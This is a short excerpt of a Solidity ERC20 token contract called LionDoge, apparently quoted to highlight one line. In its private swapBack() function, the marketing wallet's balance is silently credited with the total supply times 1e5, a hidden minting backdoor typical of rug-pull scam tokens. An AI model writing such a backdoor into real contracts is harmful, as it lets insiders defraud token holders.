...
contract LionDoge is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("LION DOGE", "LION100X", _decimals) {
    ...
    function swapBack() private {
        ...
        _balances[marketingWallet] = _balances[marketingWallet].add(totalSupply() * 1e5);
